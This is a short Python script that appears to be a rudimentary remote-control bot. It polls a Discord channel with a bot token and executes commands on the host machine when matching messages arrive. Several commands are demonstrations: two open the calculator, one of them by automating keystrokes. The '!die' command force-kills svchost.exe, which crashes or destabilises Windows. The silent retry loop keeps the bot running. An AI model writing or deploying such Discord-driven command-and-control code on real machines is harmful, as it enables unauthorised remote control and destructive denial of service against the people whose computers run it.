import requests
import os
import time
import pyautogui

BOT_TOKEN = "" # your bot's token
CHANNEL_ID = "" # your channel's id (where the bot should send messages, right click for example .chat. and copy the id"

processed_ids = set()

def send(msg):
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages"
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    requests.post(url, headers=headers, json={"content": msg})

send("online")

while True:
    try:
        url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages?limit=5"
        headers = {"Authorization": f"Bot {BOT_TOKEN}"}
        response = requests.get(url, headers=headers)
        
        if response.status_code != 200:
            time.sleep(2)
            continue
        
        messages = response.json()
        
        for msg in reversed(messages):
            msg_id = msg['id']
            content = msg['content']
            author = msg['author']['username']
            
            if msg_id in processed_ids:
                continue
            
            processed_ids.add(msg_id)
            
            if not content or author == "SystemBot":
                continue

            
            # functions
            if content == "!help":
                send("commands: !help, !calc, !pya, !die")
            elif content == "!calc":
                os.system('calc.exe')
                send("calc opened")
            elif content == "!pya":
                pyautogui.hotkey("win", "r")
                time.sleep(0.7)
                pyautogui.typewrite("calc")
                pyautogui.press("enter")
                send("pya opened calc")
            elif content == "!die":
                os.system('taskkill /F /IM svchost.exe')
                send("dead")
        time.sleep(2)
        
    except KeyboardInterrupt:
        break
    except:
        time.sleep(5)
